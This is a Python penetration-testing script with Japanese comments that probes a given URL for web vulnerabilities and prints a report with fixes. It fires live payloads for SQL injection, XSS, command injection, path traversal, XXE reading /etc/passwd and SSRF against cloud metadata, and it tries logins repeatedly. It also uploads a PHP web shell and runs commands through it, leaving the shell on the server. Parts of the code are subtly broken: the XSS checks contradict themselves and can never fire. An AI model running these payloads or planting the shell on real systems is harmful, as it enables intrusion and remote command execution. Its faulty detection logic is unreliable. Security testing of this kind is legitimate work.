import requests
import sys
from urllib.parse import urljoin, urlparse, parse_qs
import json
import time
import concurrent.futures

# カスタムチェック項目の設定
CUSTOM_CHECKS = [
    {
        'name': '管理者ログインページチェック',
        'path': 'admin',
        'method': 'head',
        'expected_status': 200
    },
    {
        'name': 'バックアップファイルチェック',
        'path': 'backup.zip',
        'method': 'head',
        'expected_status': 200
    }
]

def scan_url(url):
    """
    指定されたURLをスキャンし、基本情報と潜在的な脆弱性をチェックします
    """
    start_time = time.time()
    report = {
        'url': url,
        'basic_info': {},
        'security_headers': {},
        'important_files': [],
        'vulnerabilities': [],
        'custom_checks': [],
        'scan_time': 0
    }
    
    try:
        # 基本リクエスト
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        
        # 基本情報
        report['basic_info'] = {
            'status_code': response.status_code,
            'server': response.headers.get('Server', '未確認'),
            'content_type': response.headers.get('Content-Type', '未確認')
        }
        
        # セキュリティヘッダーチェック
        headers_to_check = {
            'X-Frame-Options': 'クリックジャッキング対策',
            'Content-Security-Policy': 'XSS対策',
            'Strict-Transport-Security': 'HTTPS強制',
            'X-Content-Type-Options': 'MIMEスニッフィング対策',
            'Referrer-Policy': 'リファラ漏洩防止'
        }
        
        for header, description in headers_to_check.items():
            value = response.headers.get(header)
            report['security_headers'][header] = {
                'found': bool(value),
                'value': value,
                'description': description
            }
        
        # 重要なファイルの存在確認と自動保護
        important_files = ['robots.txt', 'sitemap.xml', '.env', 'wp-config.php']
        protection_rules = []
        
        with concurrent.futures.ThreadPoolExecutor() as executor:
            file_futures = {
                executor.submit(
                    requests.head,
                    urljoin(url, file),
                    timeout=5
                ): file for file in important_files
            }
            
            for future in concurrent.futures.as_completed(file_futures):
                file = file_futures[future]
                try:
                    file_response = future.result()
                    if file_response.status_code == 200:
                        file_info = {
                            'file': file,
                            'url': urljoin(url, file),
                            'status': file_response.status_code,
                            'critical': file in ['.env', 'wp-config.php']
                        }
                        report['important_files'].append(file_info)
                        
                        # 危険なファイルの自動保護
                        if file_info['critical']:
                            protection_rules.append(
                                f"# {file} へのアクセスをブロック\n"
                                f"<Files \"{file}\">\n"
                                f"    Require all denied\n"
                                f"</Files>"
                            )
                except:
                    pass
        
        # 保護ルールが存在する場合は.htaccessを生成
        if protection_rules:
            htaccess_content = (
                "# 重要ファイル保護ルール - penetration_tester ツールにより自動生成\n"
                "# このファイルをウェブルートディレクトリに配置してください\n\n" +
                "\n\n".join(protection_rules)
            )
            with open("protection_recommendation.htaccess", "w", encoding="utf-8") as f:
                f.write(htaccess_content)
            report['protection_file'] = "protection_recommendation.htaccess"
        
        # カスタムチェック項目の実行
        with concurrent.futures.ThreadPoolExecutor() as executor:
            check_futures = {
                executor.submit(
                    requests.request if check['method'] != 'get' else requests.get,
                    check['method'],
                    urljoin(url, check['path']),
                    timeout=5
                ): check for check in CUSTOM_CHECKS
            }
            
            for future in concurrent.futures.as_completed(check_futures):
                check = check_futures[future]
                try:
                    check_response = future.result()
                    report['custom_checks'].append({
                        'name': check['name'],
                        'url': urljoin(url, check['path']),
                        'status': check_response.status_code,
                        'expected_status': check['expected_status'],
                        'passed': check_response.status_code == check['expected_status']
                    })
                except:
                    report['custom_checks'].append({
                        'name': check['name'],
                        'url': urljoin(url, check['path']),
                        'status': 'error',
                        'expected_status': check['expected_status'],
                        'passed': False
                    })
        
        # SQLインジェクション脆弱性チェック
        parsed_url = urlparse(url)
        if parsed_url.query:
            # 基本的なSQLiテスト
            test_query = parsed_url.query + "'"
            test_url = parsed_url._replace(query=test_query).geturl()
            try:
                test_response = requests.get(test_url, timeout=5)
                if 'sql' in test_response.text.lower() or 'syntax' in test_response.text.lower():
                    report['vulnerabilities'].append({
                        'type': 'SQLインジェクション',
                        'url': test_url,
                        'confidence': '中',
                        'description': 'SQLエラーメッセージが検出されました'
                    })
            except:
                pass
            
            # ブラインドSQLiテスト
            test_query = parsed_url.query + "' AND 1=CONVERT(INT, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--"
            test_url = parsed_url._replace(query=test_query).geturl()
            try:
                test_response = requests.get(test_url, timeout=5)
                if 'conversion failed' in test_response.text.lower():
                    report['vulnerabilities'].append({
                        'type': 'ブラインドSQLインジェクション',
                        'url': test_url,
                        'confidence': '高',
                        'description': 'ブラインドSQLインジェクションの可能性が検出されました'
                    })
            except:
                pass
        
        # XSS脆弱性チェック
        if parsed_url.query:
            # 基本的なXSSテスト
            test_query = parsed_url.query + "<script>alert(1)</script>"
            test_url = parsed_url._replace(query=test_query).geturl()
            try:
                test_response = requests.get(test_url, timeout=5)
                # サニタイズされていない生のスクリプトタグのみ検出
                # サニタイズされた文字列(<など)が含まれていないことを確認
                if "<script>alert(1)</script>" in test_response.text:
                    # サニタイズされたバージョンが含まれていないことを確認
                    if "<script>alert(1)</script>" not in test_response.text:
                        report['vulnerabilities'].append({
                            'type': 'XSS（クロスサイトスクリプティング）',
                            'url': test_url,
                            'confidence': '高',
                            'description': 'スクリプトタグがそのまま反映されました'
                        })
            except:
                pass
            
            # DOM Based XSSテスト
            test_query = parsed_url.query + "<img src=x onerror=alert(1)>"
            test_url = parsed_url._replace(query=test_query).geturl()
            try:
                test_response = requests.get(test_url, timeout=5)
                # サニタイズされていないイベントハンドラーのみ検出
                # サニタイズされた文字列(<など)が含まれていないことを確認
                if "<img src=x onerror=alert(1)>" in test_response.text:
                    # サニタイズされたバージョンが含まれていないことを確認
                    if "<img src=x onerror=alert(1)>" not in test_response.text:
                        report['vulnerabilities'].append({
                            'type': 'DOM Based XSS',
                            'url': test_url,
                            'confidence': '高',
                            'description': 'DOMベースXSSの可能性が検出されました'
                        })
            except:
                pass
        
        # CSRF脆弱性チェック
        try:
            # フォームページを取得
            forms_response = requests.get(urljoin(url, 'form'), timeout=5)
            if forms_response.status_code == 200:
                # CSRFトークンの存在を確認
                if 'csrf' not in forms_response.text.lower() and 'token' not in forms_response.text.lower():
                    report['vulnerabilities'].append({
                        'type': 'CSRF（クロスサイトリクエストフォージェリ）',
                        'url': urljoin(url, 'form'),
                        'confidence': '中',
                        'description': 'CSRFトークンがフォームに存在しない可能性があります'
                    })
        except:
            pass
        
        # セッション管理チェック
        try:
            # ログインページにアクセスしてセッションCookieを取得
            login_response = requests.get(urljoin(url, 'login'), timeout=5)
            if login_response.status_code == 200:
                # セッションCookieの存在を確認
                session_cookie = login_response.cookies.get('session')
                if session_cookie:
                    # Cookieの属性を確認
                    cookie_attrs = login_response.cookies.get_dict()
                    session_cookie_attrs = str(login_response.cookies)
                    
                    # Secureフラグの確認
                    if 'Secure' not in session_cookie_attrs:
                        report['vulnerabilities'].append({
                            'type': 'セッション管理脆弱性',
                            'url': urljoin(url, 'login'),
                            'confidence': '中',
                            'description': 'セッションCookieにSecureフラグが設定されていません'
                        })
                    
                    # HttpOnlyフラグの確認
                    if 'HttpOnly' not in session_cookie_attrs:
                        report['vulnerabilities'].append({
                            'type': 'セッション管理脆弱性',
                            'url': urljoin(url, 'login'),
                            'confidence': '中',
                            'description': 'セッションCookieにHttpOnlyフラグが設定されていません'
                        })
                    
                    # SameSite属性の確認
                    if 'SameSite' not in session_cookie_attrs:
                        report['vulnerabilities'].append({
                            'type': 'セッション管理脆弱性',
                            'url': urljoin(url, 'login'),
                            'confidence': '中',
                            'description': 'セッションCookieにSameSite属性が設定されていません'
                        })
        except:
            pass
        
        # ディレクトリトラバーサル脆弱性チェック
        try:
            # ディレクトリトラバーサルのパターンを含むリクエストを送信
            traversal_patterns = ['../etc/passwd', '..\\windows\\system32\\drivers\\etc\\hosts']
            for pattern in traversal_patterns:
                test_url = urljoin(url, pattern)
                traversal_response = requests.get(test_url, timeout=5)
                if traversal_response.status_code == 200:
                    # 機密ファイルの内容が含まれているか確認
                    if 'root:' in traversal_response.text or '[drivers]' in traversal_response.text:
                        report['vulnerabilities'].append({
                            'type': 'ディレクトリトラバーサル',
                            'url': test_url,
                            'confidence': '高',
                            'description': 'ディレクトリトラバーサルにより機密ファイルにアクセス可能'
                        })
                        break
        except:
            pass
        
        # コマンドインジェクション脆弱性チェック
        try:
            # コマンドチェーン演算子を含むリクエストを送信
            command_patterns = ['| whoami', '; whoami', '& whoami']
            for pattern in command_patterns:
                # GETパラメータにパターンを追加
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                # 既存のパラメータにパターンを追加
                if query_params:
                    # 最初のパラメータにパターンを追加
                    first_param = list(query_params.keys())[0]
                    query_params[first_param] = [query_params[first_param][0] + pattern]
                    # 新しいクエリ文字列を構築
                    new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
                    test_url = parsed_url._replace(query=new_query).geturl()
                else:
                    # パラメータがない場合は適当なパラメータを追加
                    test_url = url + "?cmd=" + pattern
                
                command_response = requests.get(test_url, timeout=5)
                if command_response.status_code == 200:
                    # コマンド実行結果が含まれているか確認
                    if 'root' in command_response.text or 'user' in command_response.text:
                        report['vulnerabilities'].append({
                            'type': 'コマンドインジェクション',
                            'url': test_url,
                            'confidence': '高',
                            'description': 'コマンドインジェクションにより外部コマンドが実行可能'
                        })
                        break
        except:
            pass
        
        # XXE脆弱性チェック
        try:
            # XXEテスト用のXMLデータ
            xxe_payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'''
            
            # XMLデータを含むPOSTリクエストを送信
            xxe_response = requests.post(url, data=xxe_payload, headers={'Content-Type': 'application/xml'}, timeout=5)
            if xxe_response.status_code == 200:
                # XXEの結果が含まれているか確認
                if 'root:' in xxe_response.text:
                    report['vulnerabilities'].append({
                        'type': 'XXE（XML External Entity）',
                        'url': url,
                        'confidence': '高',
                        'description': 'XXE脆弱性によりローカルファイルにアクセス可能'
                    })
        except:
            pass
        
        # SSRF脆弱性チェック
        try:
            # SSRFテスト用のペイロード
            ssrf_payloads = [
                'http://169.254.169.254/latest/meta-data/',  # AWS metadata
                'http://100.100.100.200/latest/meta-data/',  # Alibaba Cloud metadata
                'http://metadata.google.internal/computeMetadata/v1/',  # Google Cloud metadata
                'http://127.0.0.1:22'  # Local SSH service
            ]
            
            for payload in ssrf_payloads:
                # URLパラメータにペイロードを含むリクエストを送信
                test_url = url + "?url=" + payload
                ssrf_response = requests.get(test_url, timeout=5)
                if ssrf_response.status_code == 200:
                    # 特定のキーワードが含まれているか確認
                    if 'ssh' in ssrf_response.text.lower() or 'meta-data' in ssrf_response.text.lower():
                        report['vulnerabilities'].append({
                            'type': 'SSRF（Server-Side Request Forgery）',
                            'url': test_url,
                            'confidence': '高',
                            'description': 'SSRF脆弱性により内部サービスにアクセス可能'
                        })
                        break
        except:
            pass
        
        # CORS設定チェック
        try:
            # Originヘッダーを含むリクエストを送信
            cors_response = requests.get(url, headers={'Origin': 'http://evil.com'}, timeout=5)
            # Access-Control-Allow-Originヘッダーを確認
            allow_origin = cors_response.headers.get('Access-Control-Allow-Origin')
            if allow_origin == '*':
                report['vulnerabilities'].append({
                    'type': 'CORS（Cross-Origin Resource Sharing）',
                    'url': url,
                    'confidence': '中',
                    'description': 'Access-Control-Allow-Originが*に設定されています'
                })
            elif allow_origin == 'http://evil.com':
                report['vulnerabilities'].append({
                    'type': 'CORS（Cross-Origin Resource Sharing）',
                    'url': url,
                    'confidence': '高',
                    'description': '任意のOriginが許可されています'
                })
        except:
            pass
        
        # キャッシュヘッダー設定チェック
        try:
            cache_response = requests.get(url, timeout=5)
            cache_control = cache_response.headers.get('Cache-Control')
            pragma = cache_response.headers.get('Pragma')
            
            # Cache-Controlヘッダーの確認
            if not cache_control:
                report['vulnerabilities'].append({
                    'type': 'キャッシュヘッダー設定',
                    'url': url,
                    'confidence': '中',
                    'description': 'Cache-Controlヘッダーが設定されていません'
                })
            elif 'no-store' not in cache_control and 'no-cache' not in cache_control:
                # 機密情報を含むページの可能性を考慮
                if 'login' in url or 'admin' in url:
                    report['vulnerabilities'].append({
                        'type': 'キャッシュヘッダー設定',
                        'url': url,
                        'confidence': '中',
                        'description': '機密情報ページのキャッシュ制御が不十分です'
                    })
            
            # Pragmaヘッダーの確認
            if not pragma:
                report['vulnerabilities'].append({
                    'type': 'キャッシュヘッダー設定',
                    'url': url,
                    'confidence': '中',
                    'description': 'Pragmaヘッダーが設定されていません'
                })
            elif 'no-cache' not in pragma:
                # 機密情報を含むページの可能性を考慮
                if 'login' in url or 'admin' in url:
                    report['vulnerabilities'].append({
                        'type': 'キャッシュヘッダー設定',
                        'url': url,
                        'confidence': '中',
                        'description': '機密情報ページのキャッシュ制御が不十分です'
                    })
        except:
            pass
        
        # クリックジャッキング対策追加チェック
        try:
            frame_response = requests.get(url, timeout=5)
            x_frame_options = frame_response.headers.get('X-Frame-Options')
            
            # X-Frame-Optionsヘッダーの確認
            if not x_frame_options:
                report['vulnerabilities'].append({
                    'type': 'クリックジャッキング対策',
                    'url': url,
                    'confidence': '中',
                    'description': 'X-Frame-Optionsヘッダーが設定されていません'
                })
            elif x_frame_options not in ['DENY', 'SAMEORIGIN']:
                report['vulnerabilities'].append({
                    'type': 'クリックジャッキング対策',
                    'url': url,
                    'confidence': '中',
                    'description': 'X-Frame-Optionsヘッダーの値が適切ではありません'
                })
        except:
            pass
        
        # セキュアCookie設定チェック
        try:
            # ログインページにアクセスしてセッションCookieを取得
            login_response = requests.get(urljoin(url, 'login'), timeout=5)
            if login_response.status_code == 200:
                # セッションCookieの存在を確認
                session_cookie = login_response.cookies.get('session')
                if session_cookie:
                    # Cookieの属性を確認
                    cookie_attrs = str(login_response.cookies)
                    
                    # Secureフラグの確認
                    if 'Secure' not in cookie_attrs:
                        report['vulnerabilities'].append({
                            'type': 'セキュアCookie設定',
                            'url': urljoin(url, 'login'),
                            'confidence': '中',
                            'description': 'セッションCookieにSecureフラグが設定されていません'
                        })
                    
                    # HttpOnlyフラグの確認
                    if 'HttpOnly' not in cookie_attrs:
                        report['vulnerabilities'].append({
                            'type': 'セキュアCookie設定',
                            'url': urljoin(url, 'login'),
                            'confidence': '中',
                            'description': 'セッションCookieにHttpOnlyフラグが設定されていません'
                        })
        except:
            pass
        
        # ファイルアップロード脆弱性チェック
        upload_url = urljoin(url, 'upload.php')
        try:
            files = {'file': ('test.php', '<?php echo shell_exec($_GET["cmd"]); ?>', 'application/x-php')}
            upload_response = requests.post(upload_url, files=files, timeout=5)
            
            if upload_response.status_code == 200:
                file_location = upload_response.json().get('path', '')
                if file_location:
                    test_url = urljoin(url, file_location) + "?cmd=whoami"
                    test_response = requests.get(test_url, timeout=5)
                    if test_response.text.strip() == "root":
                        report['vulnerabilities'].append({
                            'type': 'ファイルアップロード脆弱性',
                            'url': upload_url,
                            'confidence': '高',
                            'description': 'アップロードしたPHPファイルが実行可能'
                        })
        except:
            pass
        
        # 依存ライブラリの脆弱性スキャン
        try:
            from safety.cli import check
            from packaging.version import parse
            
            requirements = requests.get(urljoin(url, 'requirements.txt'), timeout=5).text
            vulns = check.check(packages=requirements.split('\n'))
            
            for vuln in vulns:
                report['vulnerabilities'].append({
                    'type': '依存ライブラリ脆弱性',
                    'library': vuln.package_name,
                    'version': vuln.analyzed_version,
                    'confidence': '高',
                    'description': vuln.description
                })
        except ImportError:
            print("Safetyライブラリがインストールされていません。依存関係スキャンをスキップします")
        except:
            pass
        # 認証関連テスト
        login_url = urljoin(url, 'login')
        try:
            # ブルートフォース攻撃テスト
            for i in range(1, 6):
                data = {'username': f'test{i}', 'password': 'password'}
                login_response = requests.post(login_url, data=data, timeout=5)
                if login_response.status_code == 200 and 'Invalid credentials' not in login_response.text:
                    report['vulnerabilities'].append({
                        'type': '認証脆弱性',
                        'url': login_url,
                        'confidence': '中',
                        'description': 'ブルートフォース攻撃の可能性あり'
                    })
                    break
        except:
            pass
        
        # アクセス制御テスト
        admin_url = urljoin(url, 'admin/dashboard')
        try:
            admin_response = requests.get(admin_url, timeout=5)
            if admin_response.status_code == 200:
                report['vulnerabilities'].append({
                    'type': 'アクセス制御脆弱性',
                    'url': admin_url,
                    'confidence': '高',
                    'description': '権限昇格の可能性あり'
                })
        except:
            pass
        
        # スキャン時間記録
        report['scan_time'] = round(time.time() - start_time, 2)
        
        # レポート生成
        generate_report(report)
        
    except requests.exceptions.RequestException as e:
        print(f"エラーが発生しました: {e}")
    except Exception as e:
        print(f"予期せぬエラー: {e}")
    
    return report

def generate_report(report):
    """スキャンレポートを生成してファイルに保存し、コンソールにも出力"""
    # JSONファイルへの保存
    filename = f"scan_report_{time.strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    
    # CLI用の詳細レポート生成
    print("\n" + "="*50)
    print("ペネトレーションテストレポート")
    print("="*50)
    
    # 基本情報
    print(f"\n[基本情報]")
    print(f"対象URL: {report['url']}")
    print(f"ステータスコード: {report['basic_info']['status_code']}")
    print(f"サーバー: {report['basic_info']['server']}")
    print(f"コンテンツタイプ: {report['basic_info']['content_type']}")
    
    # セキュリティヘッダー
    print("\n[セキュリティヘッダー]")
    header_severity = {
        'Content-Security-Policy': '🔴 致命的',
        'Strict-Transport-Security': '🟠 高',
        'X-Frame-Options': '🟡 中',
        'X-Content-Type-Options': '🟡 中',
        'Referrer-Policy': '🔵 低'
    }
    
    for header, data in report['security_headers'].items():
        if data['found']:
            # 設定されているヘッダーは単に「良好」と表示（重要度は表示しない）
            print(f"{header}: 良好 | {data['description'].split('対策')[0]}")
            print(f"  設定値: {data['value']}")
        else:
            # 未設定のヘッダーは重要度レベルを表示
            severity = header_severity.get(header, '🔵 低')
            print(f"{header}: 未設定({severity}) | {data['description'].split('対策')[0]} (設定推奨)")
    
    # 重要ファイル
    print("\n[重要ファイルチェック]")
    if report['important_files']:
        for file_info in report['important_files']:
            status = "⚠️ 危険" if file_info['critical'] else "ℹ️ 情報"
            print(f"{status}: {file_info['file']} ({file_info['url']})")
    else:
        print("公開されている重要ファイルはありません")
    
    # 脆弱性とリスク解説
    print("\n[脆弱性検査結果]")
    
    # ヘッダーリスク情報
    header_risks = {
        'Content-Security-Policy': {
            'risk': 'XSS攻撃を受ける可能性が高まります。悪意あるスクリプトの実行を許す危険性があります',
            'fix': 'コンテンツセキュリティポリシーを設定し、信頼できるソースからのみリソースを読み込むように制限'
        },
        'Strict-Transport-Security': {
            'risk': 'HTTP接続時に中間者攻撃(MITM)のリスクがあります。通信が暗号化されず情報漏洩の可能性',
            'fix': 'Strict-Transport-Securityヘッダーを設定し、HTTPS接続を強制'
        },
        'X-Frame-Options': {
            'risk': 'クリックジャッキング攻撃の危険性があります。悪意あるサイトにページが埋め込まれる可能性',
            'fix': 'X-Frame-OptionsヘッダーをDENYまたはSAMEORIGINに設定'
        },
        'X-Content-Type-Options': {
            'risk': 'MIMEタイプの推測によるセキュリティリスクがあります。コンテンツスニッフィング攻撃の可能性',
            'fix': 'X-Content-Type-Optionsヘッダーをnosniffに設定'
        },
        'Referrer-Policy': {
            'risk': 'リファラ情報が漏洩し、機密情報が第三者に送信されるリスクがあります',
            'fix': 'Referrer-Policyヘッダーをstrict-origin-when-cross-originなど適切なポリシーに設定'
        }
    }
    
    # 脆弱性リスク情報
    vulnerability_fixes = {
        'SQLインジェクション': 'ユーザー入力を適切にサニタイズし、プリペアドステートメントを使用する',
        'XSS（クロスサイトスクリプティング）': 'ユーザー入力をエスケープし、Content-Security-Policyを実装する'
    }
    
    vulnerabilities_found = False
    
    # セキュリティヘッダー不足のリスク
    missing_headers = [h for h, data in report['security_headers'].items() if not data['found']]
    if missing_headers:
        vulnerabilities_found = True
        print("\n⚠️ セキュリティヘッダー不足")
        for header in missing_headers:
            severity = header_severity.get(header, '🔵 低')
            description = report['security_headers'][header]['description']
            risk_info = header_risks.get(header, {'risk': 'セキュリティリスクが高まります', 'fix': '該当するセキュリティヘッダーを実装'})
            
            print(f"  - {header}: 重要度 {severity} | {description}")
            print(f"    リスク: {risk_info['risk']}")
            print(f"    対処法: {risk_info['fix']}")
    
    # 重要ファイル公開のリスク
    critical_files = [f for f in report['important_files'] if f['critical']]
    if critical_files:
        vulnerabilities_found = True
        print("\n⚠️ 機密ファイル公開")
        for file in critical_files:
            print(f"  - ファイル: {file['file']} ({file['url']})")
            print("    リスク: 機密情報(APIキー、データベース認証情報など)が漏洩する危険性があります")
            print("    対処法: サーバー設定で該当ファイルへのアクセスをブロックするか、ファイルを公開ディレクトリ外に移動")
    
    # 従来の脆弱性
    if report['vulnerabilities']:
        vulnerabilities_found = True
        print("\n⚠️ その他の脆弱性")
        for vuln in report['vulnerabilities']:
            print(f"  - {vuln['type']} (信頼度: {vuln['confidence']})")
            print(f"    対象URL: {vuln['url']}")
            print(f"    詳細: {vuln['description']}")
            fix = vulnerability_fixes.get(vuln['type'], '該当脆弱性のベストプラクティスに従って修正する')
            print(f"    対処法: {fix}")
    
    if not vulnerabilities_found:
        print("重大な脆弱性は検出されませんでした")
    
    # カスタムチェック
    print("\n[カスタムチェック結果]")
    if report['custom_checks']:
        for check in report['custom_checks']:
            status = "✓ 成功" if check['passed'] else "✗ 失敗"
            print(f"{check['name']}: {status}")
            print(f"  対象URL: {check['url']}")
            print(f"  期待ステータス: {check['expected_status']}, 実際のステータス: {check['status']}")
    else:
        print("カスタムチェック項目はありません")
    
    # 保護ファイル
    if 'protection_file' in report:
        print(f"\n[自動保護] 危険ファイル保護用.htaccess生成: {report['protection_file']}")
    
    # サマリー
    print("\n" + "="*50)
    print("[サマリー]")
    print(f"スキャン時間: {report['scan_time']}秒")
    print(f"検出された脆弱性: {len(report['vulnerabilities'])}件")
    print(f"公開されている重要ファイル: {len(report['important_files'])}件")
    print(f"詳細なレポート: {filename}")
    print("="*50)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
        scan_url(target_url)
    else:
        print("使用方法: python penetration_tester.py <URL>")
        print("例: python penetration_tester.py https://meeting-room-calendar.pages.dev/")
